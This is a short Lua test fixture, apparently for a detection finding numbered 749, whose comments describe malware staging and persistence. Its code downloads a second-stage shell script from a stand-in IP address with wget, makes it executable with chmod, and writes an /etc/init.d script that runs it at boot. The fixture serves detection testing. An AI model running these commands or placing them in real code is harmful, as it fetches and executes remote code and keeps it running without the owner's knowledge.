-- Fixture: a service dropped into /etc/init.d, fetched first, made runnable (749).
--
-- The write is the persistence. The wget and the chmod are what the finding
-- calls out as staging: the file is not written from a fixed image, it is
-- fetched and then made executable.
local BASE = "http://198.51.100.7/stage2.sh"

local function fetch()
   os.execute("wget -q -O /tmp/stage2.sh " .. BASE)
   os.execute("chmod 755 /tmp/stage2.sh")
end

local function install()
   local handle = io.open("/etc/init.d/stage2", "w")
   handle:write("#!/bin/sh\n/tmp/stage2.sh &\n")
   handle:close()
end

return {fetch, install}
